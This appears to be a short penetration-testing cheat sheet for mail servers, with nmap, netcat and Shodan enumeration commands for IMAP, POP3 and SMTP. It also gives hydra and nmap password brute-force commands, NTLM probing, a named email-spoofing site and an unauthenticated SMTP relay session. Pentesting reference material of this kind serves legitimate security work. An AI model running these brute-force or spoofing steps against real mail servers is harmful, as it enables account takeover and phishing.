# Mail-Server-Attacks-Cheat-Sheet
A cheat sheet that contains common enumeration and attack methods for Mail Server.


## IMAP

### Information Gathering


```bash
  nmap [-sS] [-sC] -Pn -p 143,993 -sV --script=banner [IP]
```

```bash
  nc -nv <IP> 993 [IP]
```

```bash
  shodan search "port:143"
```

### Attacks

#### NTLM Auth

```bash
   telnet example.com 143
```

```bash
   a1 AUTHENTICATE NTLM 
```

```bash
   nmap --script=imap-ntlm-info [IP]
```

#### Bruteforce

```bash
   hydra -l USERNAME -P passwords.txt -f [IP] imap -V
```

```bash
   hydra -S -v -l USERNAME -P passwords.txt -s 993 -f [IP] imap -V
```

```bash
   nmap -sV --script imap-brute -p [PORT] [IP]
```

## POP3

### Information Gathering


```bash
  nmap [-sS] [-sC] -Pn -p 110,995 -sV --script=banner [IP]
```

```bash
  nc -nv <IP> 110 [IP]
```

```bash
  shodan search "port:995"
```

### Attacks

#### NTLM Auth

```bash
   nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -port [PORT] [IP]
```

```bash
   a1 AUTHENTICATE NTLM 
```



#### Bruteforce

```bash
   nmap -p110 --script pop3-brute <target>
```

```bash
   hydra -l muts -P pass.txt [IP] pop3
```


## SMTP

### Information Gathering

```bash
  nmap [-sS] [-sC] -Pn -p 25,465,587 -sV --script=banner or --script smtp-commands [IP]
```

```bash
  nc -nv <IP> 25 [IP]
nc -nv <IP> 465 [IP]
nc -nv <IP> 587 [IP]
```

```bash
  shodan search "port:25"
shodan search "port:465"
shodan search "port:587"
```


### Attacks

#### NTLM Auth

```bash
   telnet example.com 587 
HELO
AUTH NTLM 334 
```

```bash
   a1 AUTHENTICATE NTLM 
```



#### Bruteforce

```bash
   nmap -p[25,465,587] --script smtp-brute
 <target>
```

```bash
   hydra -l muts -P pass.txt [IP] smtp
```

#### Spoofing

```bash
   emkei.cz
```

#### Non Auth

```bash
   telnet [IP] [25 or 465 or 587]
MAIL FROM: sender@adress.ext
RCPT TO: recipient@adress.ext
SUBJECT: Test message
.

```
